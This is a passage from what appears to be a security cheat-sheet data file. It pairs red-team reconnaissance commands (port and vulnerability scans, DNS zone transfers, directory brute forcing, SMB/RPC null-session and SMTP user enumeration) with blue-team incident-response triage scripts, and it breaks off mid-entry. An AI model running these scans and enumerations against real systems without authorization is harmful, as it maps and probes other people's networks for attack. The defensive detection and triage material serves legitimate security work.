{id:"recon-nmap-scripts", level:"intermediate",requires:{"tool":"nmap"},updated:"2026-07", cat:"Reconnaissance", title:"Default NSE script scan",
 desc:"Run nmap's safe default scripts (-sC) with version detection for quick service context.",
 danger:"Scan only systems you are authorized to test.",
 team:"red", tags:["recon","network","enumeration"], attack:["T1046"],
 detect:"Version probes plus scripted follow-up requests (HTTP titles, SMB info) from one source.",
 mitigate:"Minimize service banners; patch; restrict exposure.",
 code:{
  linux:`nmap -sC -sV {{IP:10.0.0.5}}`,
  mac:`nmap -sC -sV {{IP:10.0.0.5}}`
 }},
{id:"recon-nmap-vuln", level:"intermediate",requires:{"tool":"nmap"},updated:"2026-07", cat:"Reconnaissance", title:"Vulnerability NSE scripts",
 desc:"Run nmap's 'vuln' script category to flag known-vulnerable services. Noisy.",
 danger:"Vulnerability probing — authorized engagements only.",
 team:"red", tags:["recon","network","scanning"], attack:["T1595.002"],
 detect:"Scanner-signature payloads against services; WAF/IDS vuln-scan alerts; spikes of odd requests.",
 mitigate:"Patch; virtual-patch at WAF; alert on known scanner user-agents/payloads.",
 code:{
  linux:`nmap -sV --script vuln {{IP:10.0.0.5}}`,
  mac:`nmap -sV --script vuln {{IP:10.0.0.5}}`
 }},
{id:"recon-masscan", level:"intermediate",requires:{"elevation":true,"tool":"masscan"},updated:"2026-07", cat:"Reconnaissance", title:"Mass port scan (masscan)",
 desc:"Internet-scale asynchronous TCP scanner. Requires masscan + root; set a sane --rate.",
 danger:"Very high traffic; authorized networks only. Excessive rates can disrupt links.",
 team:"red", tags:["recon","network","scanning"], attack:["T1595.001"],
 detect:"Extremely high-rate SYNs across many hosts/ports from one source; flow-volume anomaly.",
 mitigate:"Ingress rate-limiting; SYN-flood protection; block scanning source ranges.",
 code:{
  linux:`sudo masscan {{TARGET:10.0.0.0/24}} -p1-65535 --rate 1000`,
  mac:`sudo masscan {{TARGET:10.0.0.0/24}} -p1-65535 --rate 1000`
 }},

/* --- DNS --- */
{id:"recon-dns-records", level:"intermediate",updated:"2026-07", cat:"Reconnaissance", related:["recon-subdomains","recon-dns-brute"], title:"Enumerate DNS records",
 desc:"Pull the common record types for a domain. dig on mac/linux; Resolve-DnsName on Windows.",
 danger:"OSINT — scope to authorized engagements; queries public DNS, not the target.",
 team:"red", tags:["recon","dns","osint"], attack:["T1590.002"],
 detect:"Passive against the target; visible only to the resolver/authoritative server operator.",
 mitigate:"Minimize public DNS footprint; split-horizon DNS; avoid leaking internal names.",
 code:{
  linux:`for t in A AAAA MX NS TXT SOA; do echo "== $t =="; dig +short {{DOMAIN:example.com}} $t; done`,
  mac:`for t in A AAAA MX NS TXT SOA; do echo "== $t =="; dig +short {{DOMAIN:example.com}} $t; done`,
  ps:`foreach ($t in 'A','AAAA','MX','NS','TXT','SOA') { "== $t =="; Resolve-DnsName {{DOMAIN:example.com}} -Type $t -ErrorAction SilentlyContinue }`
 }},
{id:"recon-dns-reverse", level:"intermediate",updated:"2026-07", cat:"Reconnaissance", title:"Reverse DNS sweep",
 desc:"Resolve PTR records across a range to map hostnames to IPs.",
 danger:"OSINT — scope to authorized engagements; queries DNS, not the hosts.",
 team:"red", tags:["recon","dns","discovery"], attack:["T1590.002"],
 detect:"Sequential PTR lookups across a subnet at the DNS server.",
 mitigate:"Limit PTR detail for sensitive ranges; monitor bulk reverse lookups.",
 code:{
  linux:`for i in $(seq 1 254); do host {{PREFIX:10.0.0}}.$i 2>/dev/null | grep -v "not found"; done`,
  mac:`for i in $(seq 1 254); do host {{PREFIX:10.0.0}}.$i 2>/dev/null | grep -v "not found"; done`
 }},
{id:"recon-dns-axfr", level:"intermediate",updated:"2026-07", cat:"Reconnaissance", title:"Zone transfer attempt (AXFR)",
 desc:"Try to pull an entire DNS zone from a misconfigured name server.",
 danger:"Authorized engagements only.",
 team:"red", tags:["recon","dns","enumeration"], attack:["T1590.002"],
 detect:"AXFR requests from non-secondary IPs are logged by the DNS server — alert on them.",
 mitigate:"Restrict AXFR to authorized secondaries (allow-transfer); disable public zone transfers.",
 code:{
  linux:`dig axfr @{{NS:ns1.example.com}} {{DOMAIN:example.com}}`,
  mac:`dig axfr @{{NS:ns1.example.com}} {{DOMAIN:example.com}}`
 }},
{id:"recon-subdomains", level:"intermediate",requires:{"tool":"subfinder"},updated:"2026-07", cat:"Reconnaissance", related:["recon-dns-brute","recon-http-fingerprint"], title:"Passive subdomain enumeration",
 desc:"Discover subdomains from public sources (CT logs, passive DNS). Requires subfinder or amass.",
 danger:"OSINT — scope to authorized engagements; uses third-party data, not the target.",
 team:"red", tags:["recon","dns","subdomain","osint"], attack:["T1590.002"],
 detect:"Passive — invisible to the target; watch Certificate Transparency for your own exposed names.",
 mitigate:"Audit CT logs for your domains; retire stale DNS entries; wildcard carefully.",
 code:{
  linux:`subfinder -d {{DOMAIN:example.com}} -silent   # or: amass enum -passive -d {{DOMAIN:example.com}}`,
  mac:`subfinder -d {{DOMAIN:example.com}} -silent   # or: amass enum -passive -d {{DOMAIN:example.com}}`
 }},
{id:"recon-dns-brute", level:"intermediate",requires:{"tool":"gobuster"},updated:"2026-07", cat:"Reconnaissance", title:"Subdomain brute force",
 desc:"Actively guess subdomains from a wordlist. Requires gobuster (dns mode).",
 danger:"Active DNS queries; authorized engagements only.",
 team:"red", tags:["recon","dns","subdomain","scanning"], attack:["T1590.002"],
 detect:"Spike of NXDOMAIN lookups for one zone from a single resolver/source.",
 mitigate:"Rate-limit resolvers; monitor NXDOMAIN spikes; response-rate limiting.",
 code:{
  linux:`gobuster dns -d {{DOMAIN:example.com}} -w {{WORDLIST:/usr/share/wordlists/subdomains.txt}}`,
  mac:`gobuster dns -d {{DOMAIN:example.com}} -w {{WORDLIST:/usr/share/wordlists/subdomains.txt}}`
 }},

/* --- web --- */
{id:"recon-http-fingerprint", level:"intermediate",requires:{"tool":"whatweb"},updated:"2026-07", cat:"Reconnaissance", title:"Web server & tech fingerprint",
 desc:"Identify server, framework, and technologies. whatweb (dep) or native curl/Invoke-WebRequest.",
 danger:"Authorized targets only.",
 team:"red", tags:["recon","web","enumeration"], attack:["T1592"],
 detect:"Low signal; a HEAD/GET plus tech-probe requests. Odd user-agents (WhatWeb) in web logs.",
 mitigate:"Suppress version banners (Server/X-Powered-By); generic error pages.",
 code:{
  linux:`whatweb {{URL:http://10.0.0.5}}   # or: curl -sI {{URL:http://10.0.0.5}}`,
  mac:`whatweb {{URL:http://10.0.0.5}}   # or: curl -sI {{URL:http://10.0.0.5}}`,
  ps:`(Invoke-WebRequest {{URL:http://10.0.0.5}} -Method Head).Headers`
 }},
{id:"recon-dir-brute", level:"intermediate",requires:{"tool":"ffuf"},updated:"2026-07", cat:"Reconnaissance", title:"Directory & file brute force",
 desc:"Discover hidden paths/files on a web server from a wordlist. Requires ffuf (or gobuster).",
 danger:"Authorized targets only; generates heavy request volume.",
 team:"red", tags:["recon","web","scanning"], attack:["T1595.003"],
 detect:"Many 404/403 responses to random paths from one source; WAF path-enumeration alerts.",
 mitigate:"Rate-limit; WAF; remove sensitive files; block on 404 thresholds.",
 code:{
  linux:`ffuf -u {{URL:http://10.0.0.5}}/FUZZ -w {{WORDLIST:/usr/share/wordlists/dirb/common.txt}} -mc 200,301,302,403`,
  mac:`ffuf -u {{URL:http://10.0.0.5}}/FUZZ -w {{WORDLIST:/usr/share/wordlists/dirb/common.txt}} -mc 200,301,302,403`
 }},
{id:"recon-vhost", level:"intermediate",requires:{"tool":"ffuf"},updated:"2026-07", cat:"Reconnaissance", title:"Virtual host discovery",
 desc:"Find name-based virtual hosts by fuzzing the Host header. Requires ffuf.",
 danger:"Authorized targets only.",
 team:"red", tags:["recon","web","subdomain","scanning"], attack:["T1595.003"],
 detect:"Many requests to one IP with varying Host headers; unusual host values in logs.",
 mitigate:"Default-deny unknown vhosts; return generic response for unmatched Host.",
 code:{
  linux:`ffuf -u http://{{IP:10.0.0.5}}/ -H "Host: FUZZ.{{DOMAIN:example.com}}" -w {{WORDLIST:/usr/share/wordlists/subdomains.txt}} -fs 0`,
  mac:`ffuf -u http://{{IP:10.0.0.5}}/ -H "Host: FUZZ.{{DOMAIN:example.com}}" -w {{WORDLIST:/usr/share/wordlists/subdomains.txt}} -fs 0`
 }},
{id:"recon-robots", level:"intermediate",updated:"2026-07", cat:"Reconnaissance", title:"robots.txt & sitemap",
 desc:"Fetch robots.txt and sitemap.xml for hints at hidden or sensitive paths.",
 danger:"Authorized targets only.",
 team:"red", tags:["recon","web","osint","quick-win"], attack:["T1594"],
 detect:"Low signal — normal-looking GETs to /robots.txt and /sitemap.xml.",
 mitigate:"Don't list sensitive paths in robots.txt; protect them with authz instead.",
 code:{
  linux:`curl -s {{URL:http://10.0.0.5}}/robots.txt; echo; curl -s {{URL:http://10.0.0.5}}/sitemap.xml`,
  mac:`curl -s {{URL:http://10.0.0.5}}/robots.txt; echo; curl -s {{URL:http://10.0.0.5}}/sitemap.xml`,
  ps:`(Invoke-WebRequest {{URL:http://10.0.0.5}}/robots.txt).Content`
 }},
{id:"recon-tls-san", level:"intermediate",updated:"2026-07", cat:"Reconnaissance", title:"TLS certificate SAN names",
 desc:"Extract Subject Alternative Names from a host's cert to reveal related hostnames.",
 danger:"OSINT — scope to authorized engagements.",
 team:"red", tags:["recon","tls","subdomain","osint"], attack:["T1592"],
 detect:"A single TLS handshake — effectively invisible; the same data is public in CT logs.",
 mitigate:"Assume SANs are public; avoid putting internal hostnames on public certs.",
 code:{
  linux:`echo | openssl s_client -connect {{HOST:example.com}}:443 -servername {{HOST:example.com}} 2>/dev/null | openssl x509 -noout -text | grep -A1 "Subject Alternative Name"`,
  mac:`echo | openssl s_client -connect {{HOST:example.com}}:443 -servername {{HOST:example.com}} 2>/dev/null | openssl x509 -noout -text | grep -A1 "Subject Alternative Name"`
 }},
{id:"recon-wafw00f", level:"intermediate",requires:{"tool":"wafw00f"},updated:"2026-07", cat:"Reconnaissance", title:"WAF detection",
 desc:"Identify whether (and which) web application firewall fronts a site. Requires wafw00f.",
 danger:"Authorized targets only.",
 team:"red", tags:["recon","web","enumeration"], attack:["T1592"],
 detect:"A handful of probe requests designed to trigger WAF fingerprints; low volume.",
 mitigate:"Not much to do — but ensure the WAF fails closed and hides its vendor where possible.",
 code:{
  linux:`wafw00f {{URL:http://10.0.0.5}}`,
  mac:`wafw00f {{URL:http://10.0.0.5}}`
 }},
{id:"recon-wpscan", level:"intermediate",requires:{"tool":"wpscan"},updated:"2026-07", cat:"Reconnaissance", title:"WordPress enumeration",
 desc:"Enumerate WordPress users, themes, and vulnerable plugins. Requires wpscan (+API token for vuln data).",
 danger:"Authorized targets only.",
 team:"red", tags:["recon","web","enumeration"], attack:["T1595.002"],
 detect:"Enumeration of /wp-json/wp/v2/users and ?author= scans; plugin/readme probing in web logs.",
 mitigate:"Block user enumeration; hide version/readme; limit login; keep plugins patched; WAF.",
 code:{
  linux:`wpscan --url {{URL:http://10.0.0.5}} --enumerate u,vp   # add --api-token for vuln data`,
  mac:`wpscan --url {{URL:http://10.0.0.5}} --enumerate u,vp   # add --api-token for vuln data`
 }},

/* --- SMB / NetBIOS / SNMP / RPC --- */
{id:"recon-smb-shares", level:"intermediate",updated:"2026-07", cat:"Reconnaissance", title:"SMB share enumeration",
 desc:"List SMB shares over a null session. smbclient (mac/linux) or native net view (Windows).",
 danger:"Authorized targets only.",
 team:"red", tags:["recon","smb","enumeration"], attack:["T1135"],
 detect:"Anonymous/guest SMB session then share enumeration; Windows events 5140/5145.",
 mitigate:"Disable null/guest sessions; require SMB signing; restrict share access.",
 code:{
  linux:`smbclient -L //{{IP:10.0.0.5}}/ -N   # or: nmap --script smb-enum-shares -p445 {{IP:10.0.0.5}}`,
  mac:`smbclient -L //{{IP:10.0.0.5}}/ -N`,
  ps:`net view \\\\{{IP:10.0.0.5}} /all`
 }},
{id:"recon-smb-enum", level:"intermediate",requires:{"tool":"enum4linux-ng"},updated:"2026-07", cat:"Reconnaissance", title:"SMB / host enumeration (enum4linux-ng)",
 desc:"Enumerate users, groups, shares, and policy over SMB/RPC/LDAP. Requires enum4linux-ng.",
 danger:"Authorized targets only.",
 team:"red", tags:["recon","smb","enumeration","active-directory"], attack:["T1087","T1135"],
 detect:"Bursts of SMB/RPC/LDAP queries (users, groups, shares, policy) from one host in seconds.",
 mitigate:"Disable null sessions; restrict anonymous LDAP; SMB signing; monitor RPC/LDAP enum.",
 code:{
  linux:`enum4linux-ng -A {{IP:10.0.0.5}}`
 }},
{id:"recon-nbtscan", level:"intermediate",updated:"2026-07", cat:"Reconnaissance", title:"NetBIOS name scan",
 desc:"Query NetBIOS names/roles across a range. nmblookup (samba) or nbtscan.",
 danger:"Authorized networks only.",
 team:"red", tags:["recon","smb","discovery"], attack:["T1018"],
 detect:"UDP/137 NetBIOS name queries across many hosts from one source.",
 mitigate:"Disable NetBIOS over TCP/IP where unused; filter UDP/137 at boundaries.",
 code:{
  linux:`nmblookup -A {{IP:10.0.0.5}}   # or: nbtscan {{TARGET:10.0.0.0/24}}`,
  mac:`nmblookup -A {{IP:10.0.0.5}}`,
  ps:`nbtstat -A {{IP:10.0.0.5}}`
 }},
{id:"recon-snmp-walk", level:"intermediate",updated:"2026-07", cat:"Reconnaissance", title:"SNMP enumeration",
 desc:"Walk SNMP with a community string to pull system, interface, and process data. Requires net-snmp.",
 danger:"Authorized targets only.",
 team:"red", tags:["recon","snmp","enumeration"], attack:["T1046"],
 detect:"SNMP GET/WALK with default community strings from non-management hosts; UDP/161 spikes.",
 mitigate:"Use SNMPv3 (auth+priv); change/remove default communities; restrict UDP/161 by ACL.",
 code:{
  linux:`snmpwalk -v2c -c {{COMMUNITY:public}} {{IP:10.0.0.5}}`,
  mac:`snmpwalk -v2c -c {{COMMUNITY:public}} {{IP:10.0.0.5}}`
 }},
{id:"recon-rpc-enum", level:"intermediate",updated:"2026-07", cat:"Reconnaissance", title:"RPC user/group enumeration",
 desc:"Use a null RPC session to list domain users and groups. Requires samba (rpcclient).",
 danger:"Authorized targets only.",
 team:"red", tags:["recon","smb","enumeration","active-directory"], attack:["T1087"],
 detect:"SAMR/LSARPC queries over a null session (enumdomusers/enumdomgroups) at the DC.",
 mitigate:"Restrict anonymous RPC; RestrictAnonymous/RestrictRemoteSAM; monitor SAMR enum.",
 code:{
  linux:`rpcclient -U "" -N {{IP:10.0.0.5}} -c "enumdomusers;enumdomgroups"`,
  mac:`rpcclient -U "" -N {{IP:10.0.0.5}} -c "enumdomusers;enumdomgroups"`
 }},

/* --- services / mail / OSINT --- */
{id:"recon-banner-grab", level:"intermediate",updated:"2026-07", cat:"Reconnaissance", title:"Banner grabbing",
 desc:"Connect to a port and read the service banner with netcat.",
 danger:"Authorized targets only.",
 team:"red", tags:["recon","network","banner","quick-win"], attack:["T1046"],
 detect:"Raw TCP connects that read the banner then disconnect; many short-lived sessions.",
 mitigate:"Suppress/normalize service banners; alert on connect-and-drop patterns.",
 code:{
  linux:`nc -nv {{IP:10.0.0.5}} {{PORT:22}}`,
  mac:`nc -nv {{IP:10.0.0.5}} {{PORT:22}}`
 }},
{id:"recon-smtp-userenum", level:"intermediate",updated:"2026-07", cat:"Reconnaissance", title:"SMTP user enumeration (VRFY)",
 desc:"Probe an SMTP server with VRFY to test which usernames exist.",
 danger:"Authorized targets only.",
 team:"red", tags:["recon","mail","enumeration"], attack:["T1087"],
 detect:"Many SMTP VRFY/EXPN/RCPT probes from one source; mail logs show user enumeration.",
 mitigate:"Disable VRFY/EXPN; return generic responses; rate-limit; tarpit.",
 code:{
  linux:`for u in root admin test info; do printf "VRFY %s\\r\\n" "$u" | nc -w2 {{IP:10.0.0.5}} 25; done`,
  mac:`for u in root admin test info; do printf "VRFY %s\\r\\n" "$u" | nc -w2 {{IP:10.0.0.5}} 25; done`
 }},
{id:"recon-whois", level:"intermediate",updated:"2026-07", cat:"Reconnaissance", title:"WHOIS / registration lookup",
 desc:"Look up domain/IP registration, registrar, and org data. Native whois on mac/linux.",
 danger:"OSINT — scope to authorized engagements; queries registries, not the target.",
 team:"red", tags:["recon","osint","dns"], attack:["T1590.001"],
 detect:"Passive — invisible to the target.",
 mitigate:"Use WHOIS/registration privacy; minimize org data in public records.",
 code:{
  linux:`whois {{DOMAIN:example.com}}`,
  mac:`whois {{DOMAIN:example.com}}`,
  ps:`Invoke-RestMethod "https://rdap.org/domain/{{DOMAIN:example.com}}"`
 }},
{id:"recon-theharvester", level:"intermediate",updated:"2026-07", cat:"Reconnaissance", title:"Email & host OSINT (theHarvester)",
 desc:"Gather emails, hosts, and subdomains from public sources. Requires theHarvester.",
 danger:"OSINT — scope to authorized engagements; uses third-party data, not the target.",
 team:"red", tags:["recon","osint","subdomain","mail"], attack:["T1589.002"],
 detect:"Passive — invisible to the target; reduce exposure of employee emails/hosts publicly.",
 mitigate:"Limit public email exposure; awareness training; monitor for your data in breach dumps.",
 code:{
  linux:`theHarvester -d {{DOMAIN:example.com}} -b bing,crtsh,duckduckgo`,
  mac:`theHarvester -d {{DOMAIN:example.com}} -b bing,crtsh,duckduckgo`
 }},
{id:"recon-shodan", level:"intermediate",updated:"2026-07", cat:"Reconnaissance", title:"Shodan host lookup",
 desc:"Query Shodan's scan database for a host's exposed services. Requires the shodan CLI + API key.",
 danger:"OSINT — scope to authorized engagements; reads a third-party database, not the target.",
 team:"red", tags:["recon","osint","network"], attack:["T1596.005"],
 detect:"Passive — invisible to the target; monitor your own external attack surface for exposure.",
 mitigate:"Reduce internet-exposed services; request removal; continuous EASM monitoring.",
 code:{
  linux:`shodan host {{IP:10.0.0.5}}   # first run: shodan init <API_KEY>`,
  mac:`shodan host {{IP:10.0.0.5}}   # first run: shodan init <API_KEY>`
 }},

/* ================= TOOLS ================= */
{id:"tool-nmap", updated:"2026-07", cat:"Tools", title:"Nmap",
 desc:"Network mapper — host discovery, port/service/OS fingerprinting.",
 url:"https://nmap.org/download.html", license:"open source (NPSL)",
 platforms:["windows","macos","linux"],
 tags:["network","recon"], attack:["T1046","T1595"],
 "steps":[{"title":"Find which hosts are alive","cmd":"nmap -sn {{SUBNET:10.0.0.0/24}}","note":"A ping sweep (-sn) with no port scan — it just reports which addresses respond, so you can narrow a big range down to real hosts before scanning them in depth."},{"title":"Quick-scan the common ports","cmd":"nmap -F {{TARGET:10.0.0.5}}","note":"-F checks only the 100 most common ports, giving you a fast first look at what a host is running before committing to a longer scan."},{"title":"Full port scan with service versions","cmd":"nmap -sV -p- {{TARGET:10.0.0.5}}","note":"-p- scans all 65535 TCP ports and -sV probes each open one to identify the service and version. This is the workhorse scan; it takes longer, so run it once you know a host is worth it."},{"title":"OS detection and default scripts","cmd":"sudo nmap -A {{TARGET:10.0.0.5}}","optional":true,"note":"-A bundles OS fingerprinting, version detection, default NSE scripts, and traceroute. It needs root and is noisy on the wire, so use it when stealth isn't a concern."},{"title":"Run a script category (e.g. vuln checks)","cmd":"nmap --script vuln {{TARGET:10.0.0.5}}","optional":true,"note":"The Nmap Scripting Engine has categories like vuln, auth, and discovery. --script vuln runs known-vulnerability checks against the open services it finds."},{"title":"Save results in every format","cmd":"nmap -sV -oA scan {{TARGET:10.0.0.5}}","note":"-oA writes scan.nmap (readable), scan.gnmap (greppable), and scan.xml (for other tools) in one go — keep these for reporting and to feed follow-up tooling."}],install:{cmd:"winget install Insecure.Nmap", mac:"brew install nmap", linux:"sudo apt install nmap"}},

/* ================= INCIDENT RESPONSE & LIVE TRIAGE ================= */
{id:"ir-collect-triage", level:"intermediate",requires:{"elevation":true}, cat:"Incident Response & Live Triage", title:"Volatile-data snapshot bundle",
 desc:"Capture system, network, process, and session state to a timestamped folder before it changes.",
 danger:"Run elevated for full process/owner data. Writes a triage folder.",
 team:"blue", tags:["incident-response","triage"],
 related:["ir-proc-suspicious","ir-proc-hash","ir-persistence-sweep"],
 code:{
  ps:`$o = "triage_" + $env:COMPUTERNAME + "_" + (Get-Date -f yyyyMMdd_HHmmss); New-Item -Type Directory $o | Out-Null
systeminfo            > "$o/sysinfo.txt"
ipconfig /all         > "$o/ipconfig.txt"
Get-NetTCPConnection  | Out-File "$o/connections.txt"
Get-Process           | Out-File "$o/processes.txt"
query user 2>$null    > "$o/sessions.txt"
arp -a                > "$o/arp.txt"
"Collected to $o"`,
  linux:`o="triage_$(hostname)_$(date +%Y%m%d_%H%M%S)"; mkdir -p "$o"
uname -a > "$o/uname.txt"; ip a > "$o/ip.txt"; ip route > "$o/routes.txt"
ss -tunap > "$o/connections.txt" 2>/dev/null; ps auxww > "$o/processes.txt"
who -a > "$o/sessions.txt"; ip neigh > "$o/arp.txt" 2>/dev/null
echo "Collected to $o"`,
  mac:`o="triage_$(hostname)_$(date +%Y%m%d_%H%M%S)"; mkdir -p "$o"
uname -a > "$o/uname.txt"; ifconfig > "$o/ifconfig.txt"; netstat -rn > "$o/routes.txt"
sudo lsof -nP -iTCP -sTCP:ESTABLISHED > "$o/connections.txt" 2>/dev/null
ps auxww > "$o/processes.txt"; who -a > "$o/sessions.txt"; arp -an > "$o/arp.txt"
echo "Collected to $o"`
 }},
{id:"ir-proc-suspicious", level:"intermediate", cat:"Incident Response & Live Triage", title:"Processes from suspicious paths",
 desc:"Flag running processes whose image lives in a user-writable/temp location (dropper indicator).",
 team:"blue", tags:["incident-response","triage","process"], attack:["T1036"],
 related:["ir-proc-hash","ir-proc-netmap"],
 code:{
  ps:`Get-CimInstance Win32_Process | Where-Object { $_.ExecutablePath -match 'Temp|AppData|ProgramData|Public' } |
  Select-Object ProcessId, Name, ExecutablePath, CommandLine`,
  linux:`# binaries deleted-after-exec or run from a temp dir:
ls -l /proc/*/exe 2>/dev/null | grep -E 'deleted|/tmp/|/dev/shm/|/var/tmp/'`,
  mac:`ps -axo pid,comm | grep -Ei '/tmp/|/users/shared/|/private/tmp/'`
 }},
{id:"ir-proc-hash", level:"intermediate",requires:{"elevation":true}, cat:"Incident Response & Live Triage", title:"Hash running-process images",
 desc:"SHA-256 every running executable to match against IOC / known-bad hash lists.",
 danger:"Run elevated to reach every process image.",
 team:"blue", tags:["incident-response","triage","process"],
 related:["ir-proc-netmap","ir-persistence-sweep"],
 code:{
  ps:`Get-Process | Where-Object Path | Select-Object -Unique Path |
  ForEach-Object { [pscustomobject]@{ SHA256=(Get-FileHash $_.Path -Algorithm SHA256).Hash; Path=$_.Path } }`,
  linux:`for p in /proc/[0-9]*/exe; do t=$(readlink -f "$p" 2>/dev/null); [ -f "$t" ] && printf "%s  %s\\n" "$(sha256sum "$t" | cut -d' ' -f1)" "$t"; done | sort -u`,
  mac:`ps -axo comm= | sort -u | while read b; do [ -f "$b" ] && shasum -a 256 "$b"; done`
 }},
{id:"ir-proc-netmap", level:"intermediate",requires:{"elevation":true}, cat:"Incident Response & Live Triage", title:"Connections mapped to processes",
 desc:"Established sessions with the owning PID, process name, and (where available) command line.",
 team:"blue", tags:["incident-response","triage","network"],
 related:["ir-proc-suspicious","ir-persistence-sweep"],
 code:{
  ps:`Get-NetTCPConnection -State Established | ForEach-Object {
  $p = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue
  [pscustomobject]@{ Remote="$($_.RemoteAddress):$($_.RemotePort)"; PID=$_.OwningProcess; Proc=$p.ProcessName; Path=$p.Path }
}`,
  linux:`ss -tunap state established`,
  mac:`sudo lsof -nP -iTCP -sTCP:ESTABLISHED`
 }},
{id:"ir-persistence-sweep", level:"intermediate",requires:{"elevation":true}, cat:"Incident Response & Live Triage", title:"Persistence sweep",
 desc:"One pass over the common autostart locations (run keys/services/tasks, or cron/systemd/launchd).",
 danger:"Run elevated to cover all users/system scope.",
 team:"blue", tags:["incident-response","persistence","triage"], attack:["T1547"],
 related:["ir-proc-suspicious","ir-collect-triage"],
 code:{
  ps:`"== Run keys =="
Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run','HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -ErrorAction SilentlyContinue
"== Auto services outside Windows dir =="
Get-CimInstance Win32_Service | Where-Object { $_.StartMode -eq 'Auto' -and $_.PathName -notmatch 'Windows' } | Select-Object Name, PathName
"== Non-Microsoft scheduled tasks =="
Get-ScheduledTask | Where-Object { $_.TaskPath -notmatch 'Microsoft' } | Select-Object TaskPath, TaskName, State`,
  linux:`echo "== cron =="; crontab -l 2>/dev/null; ls -la /etc/cron.* /etc/crontab 2>/dev/null
echo "== systemd enabled =="; systemctl list-unit-files --state=enabled --no-pager
echo "== rc.local / profile.d =="; ls -la /etc/rc.local /etc/profile.d/ 2>/dev/null`,
  mac:`echo "== LaunchAgents/Daemons =="; ls -la ~/Library/LaunchAgents /Library/LaunchAgents /Library/LaunchDaemons 2>/dev/null
echo "== login items =="; osascript -e 'tell application "System Events" to get the name of every login item' 2>/dev/null
echo "== cron =="; crontab -l 2>/dev/null`
 }},
{id:"ir-new-accounts", level:"intermediate",requires:{"elevation":true}, cat:"Incident Response & Live Triage", title:"New / privileged accounts",
 desc:"Surface recently created accounts and current admin/sudo membership.",
 danger:"Run elevated.",
 team:"blue", tags:["incident-response","account","triage"], attack:["T1136"],
 code:{
  ps:`Get-LocalUser | Sort-Object PasswordLastSet -Descending | Select-Object Name, Enabled, PasswordLastSet, LastLogon
"== Administrators =="; Get-LocalGroupMember Administrators | Select-Object Name, PrincipalSource`,
  linux:`sort -t: -k3 -n /etc/passwd | tail -8
echo "== sudo/wheel =="; getent group sudo wheel 2>/dev/null
echo "== passwd/shadow mtime =="; stat -c '%y %n' /etc/passwd /etc/shadow 2>/dev/null`,
  mac:`dscl . -list /Users | grep -v '^_'
echo "== admin group =="; dscl . -read /Groups/admin GroupMembership`
 }},
{id:"ir-recent-exe", level:"intermediate",requires:{"elevation":true}, cat:"Incident Response & Live Triage", title:"Recently written executables",
 desc:"Executables/scripts dropped into system or temp dirs in the last few days.",
 danger:"Run elevated.",
 team:"blue", tags:["incident-response","triage","persistence"], attack:["T1105"],
 code:{
  ps:`Get-ChildItem C:\\Windows\\Temp, $env:TEMP, C:\\ProgramData -Include *.exe,*.dll,*.ps1,*.bat -Recurse -ErrorAction SilentlyContinue |
  Where-Object LastWriteTime -gt (Get-Date).AddDays(-3) | Select-Object FullName, LastWriteTime, Length | Sort-Object LastWriteTime -Descending`,
  linux:`find /tmp /var/tmp /dev/shm /home -type f -mtime -3 \\( -perm -u+x -o -name '*.sh' -o -name '*.py' \\) 2>/dev/null -printf '%TY-%Tm-%Td %p\\n' | sort`,
  mac:`find /tmp /var/tmp /Users -type f -mtime -3 \\( -perm -u+x -o -name '*.sh' -o -name '*.py' \\) 2>/dev/null -exec stat -f '%Sm %N' {} + | sort`
 }},
{id:"ir-ioc-hash", level:"intermediate", cat:"Incident Response & Live Triage", title:"Hunt a known-bad hash",
 desc:"Search a path for any file matching a known-bad SHA-256.",
 team:"blue", tags:["incident-response","forensics"],
 code:{
  ps:`$bad = "{{SHA256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855}}"
Get-ChildItem {{PATH:C:/Users}} -Recurse -File -ErrorAction SilentlyContinue |
  Where-Object { (Get-FileHash $_.FullName -Algorithm SHA256).Hash -eq $bad } | Select-Object FullName`,
  linux:`BAD={{SHA256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855}}
find {{PATH:/home}} -type f 2>/dev/null -exec sha256sum {} + | awk -v b="$BAD" 'tolower($1)==tolower(b){print $2}'`,
  mac:`BAD={{SHA256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855}}
find {{PATH:/Users}} -type f 2>/dev/null -exec shasum -a 256 {} + | awk -v b="$BAD" 'tolower($1)==tolower(b){print $2}'`
 }},
{id:"ir-ioc-ip", level:"intermediate",requires:{"elevation":true}, cat:"Incident Response & Live Triage", title:"Hunt a known-bad IP",
 desc:"Check live connections, DNS cache, and logs for a suspect IP address.",
 team:"blue", tags:["incident-response","network"],
 code:{
  ps:`$ip="{{IP:203.0.113.10}}"
Get-NetTCPConnection | Where-Object RemoteAddress -eq $ip | Select-Object LocalPort, RemoteAddress, RemotePort, OwningProcess
Get-DnsClientCache | Where-Object Data -eq $ip`,
  linux:`IP={{IP:203.0.113.10}}
ss -tunap | grep "$IP"; echo "-- logs --"; grep -R "$IP" /var/log 2>/dev/null | tail`,
  mac:`IP={{IP:203.0.113.10}}
sudo lsof -nP -iTCP | grep "$IP"; netstat -an | grep "$IP"`
 }},
{id:"ir-logon-anomalies", level:"intermediate",requires:{"elevation":true}, cat:"Incident Response & Live Triage", title:"Recent network / RDP logons",
 desc:"Successful logons in the last day filtered to remote types (network/RDP) with source.",
 danger:"Requires administrator / root to read the security/auth logs.",
 team:"blue", tags:["incident-response","logs","account"], attack:["T1078"],
 code:{
  ps:`Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624; StartTime=(Get-Date).AddHours(-24)} -MaxEvents 100 |
  ForEach-Object { [pscustomobject]@{ Time=$_.TimeCreated; User=$_.Properties[5].Value; Type=$_.Properties[8].Value; Src=$_.Properties[18].Value } } |
  Where-Object { $_.Type -in 3,10 }`,
  linux:`last -20
echo "-- auth --"; sudo grep -Ei 'accepted|failed password' /var/log/auth.log /var/log/secure 2>/dev/null | tail -20`,
  mac:`last -20
log show --last 24h --predicate 'eventMessage CONTAINS[c] "authentication"' 2>/dev/null | tail -20`
 }},
{id:"ir-svc-new", level:"intermediate",requires:{"elevation":true}, cat:"Incident Response & Live Triage", title:"Newly installed services",
 desc:"Service-install events (a common persistence step). Windows event 7045; recent systemd/launchd units.",
 danger:"Requires administrator / root.",
 team:"blue", tags:["incident-response","persistence","logs"], attack:["T1543.003"],
 code:{
